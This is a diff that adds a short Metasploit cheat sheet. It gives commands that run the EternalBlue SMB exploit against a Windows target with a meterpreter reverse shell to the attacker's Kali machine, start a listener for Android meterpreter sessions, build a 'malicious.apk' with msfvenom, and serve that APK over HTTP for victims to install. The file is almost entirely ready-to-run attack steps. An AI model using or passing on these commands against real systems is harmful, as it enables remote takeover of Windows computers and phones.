@@ -1,0 +1,31 @@
+metasploit
+
+--------------------------
+sudo msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST <target_ip>         # Replace with target IP
+set LHOST <kali_ip>           # Your Kali Linux IP
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+show options                  # Verify all required settings (e.g., RPORT 445)
+exploit                       # Run the exploit
+
+----------------------------------------------
+
+msfconsole
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST <kali_ip>           # Your Kali Linux IP
+set LPORT 4444
+exploit -j                    # Run as background job
+
+
+---------------------------------------------
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -o malicious.apk
+
+
+---------------------------------------------
+
+python3 -m http.server 80     # Host APK on port 80 (no sudo needed)
+# Or for port 8000:
+# python3 -m http.server
